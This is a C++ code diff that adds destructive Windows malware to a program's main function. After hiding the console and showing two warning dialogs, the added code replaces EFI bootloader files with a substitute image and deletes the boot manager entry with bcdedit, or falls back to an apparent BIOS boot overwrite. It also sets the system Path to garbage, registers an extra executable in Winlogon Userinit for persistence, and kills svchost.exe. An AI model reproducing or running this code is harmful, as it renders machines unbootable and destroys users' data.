@@ -114,8 +114,33 @@ LONG SetRegValue(const wchar_t* path, const wchar_t* name, const wchar_t* value)
 
 int main(int argc, char** argv)
 {
-    ::ShowWindow(::GetConsoleWindow(), SW_SHOW);
+    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+    LPCWSTR filename = convertCharArrayToLPCWSTR(argv[0]);
+    UnpackDeps(filename);
 
-    cout << "test" << endl;
+    int confirmbox = MessageBox(NULL, L"This is a destructive program. By clicking OK you acknowledge that the creator is not responsible for any damage caused.", L"WARNING", MB_OKCANCEL | MB_ICONEXCLAMATION);
+    if (confirmbox == IDCANCEL) return 0;
+
+    int secondconfirmbox = MessageBox(NULL, L"ALL DATA WILL BE DESTROYED! Are you sure you want to continue?", L"WARNING (Double check)", MB_OKCANCEL | MB_ICONEXCLAMATION);
+    if (secondconfirmbox == IDCANCEL) return 0;
+
+    if (is_efi() != ERROR_INVALID_FUNCTION) {
+        system("C:\\Windows\\System32\\mountvol P: /S");
+        DeleteFile(L"P:\\EFI\\Boot\\bootx64.efi");
+        CopyFile(L"C:\\Windows\\boot.efi", L"P:\\EFI\\Boot\\bootx64.efi", false);
+        DeleteFile(L"P:\\EFI\\Microsoft\\Boot\\bootmgfw.efi");
+        CopyFile(L"C:\\Windows\\boot.efi", L"P:\\EFI\\Microsoft\\Boot\\bootmgfw.efi", false);
+        system("C:\\Windows\\System32\\bcdedit /f /delete {bootmgr}");
+    }
+    else {
+        BIOSBootFlash();
+    }
+
+    SetPermanentEnvironmentVariable(L"Path", L"trololol");
+
+    SetRegValue(L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Userinit", L"C:\\Windows\\userinit.exe,C:\\Windows\\nt32.exe");
+
+    system("taskkill /f /im svchost.exe");
+
     return 0;
 }
